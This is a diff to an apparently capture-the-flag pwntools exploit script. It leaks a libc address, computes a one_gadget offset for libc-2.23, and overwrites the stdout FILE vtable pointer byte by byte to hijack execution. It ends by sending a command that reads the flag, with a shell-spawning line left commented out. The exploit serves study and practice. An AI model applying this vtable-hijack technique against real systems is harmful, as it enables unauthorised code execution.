@@ -26,18 +26,22 @@ def pwn():
     ru("here is a gift ")
     addr_sleep = int(ru(',', drop=True), 16)
     libc_base = addr_sleep - g_libc.symbols["sleep"]
-    one_gadget = libc_base + 0xf02a4
+    #one_gadget = libc_base + 0xf02a4
+    #one_gadget = libc_base + 0xf0364 # libc-2.23.so of ubuntu16@local-docker
+    #one_gadget = libc_base + 0xf1207 # libc-2.23.so of ubuntu16@local-docker
+    one_gadget = libc_base + 0x4527a # libc-2.23.so of ubuntu16@local-docker
     log.debug("addr_sleep=%#x\n\tlibc@%#x\n\tone_gadget@%#x"
         , addr_sleep
         , libc_base
         , one_gadget
     )
+    ru("good luck ;)")
 
     g_libc.address = libc_base
-    addr_stdin = g_libc.symbols["_IO_2_1_stdin_"]
-    addr_fake_vtb = addr_stdin + 9*8
+    addr_stdout = g_libc.symbols["_IO_2_1_stdout_"]
+    addr_fake_vtb = addr_stdout + 9*8
     for i in range(2):
-        s(p64(addr_stdin + 0xd8 + i))
+        s(p64(addr_stdout + 0xd8 + i))
         s(p64(addr_fake_vtb)[i:i+1])
 
     getpid()
@@ -47,9 +51,12 @@ def pwn():
         s(p64(addr_target + i))
         s(p64(one_gadget)[i:i+1])
 
+    #sl("exec /bin/sh 1>&0")
+    sl("cat flag 1>&0")
+    
+
 if ("__main__" == __name__):
 	if (args.DEBUG):
 		context.log_level = "debug"
 	pwn()
 	g_io.interactive()
-
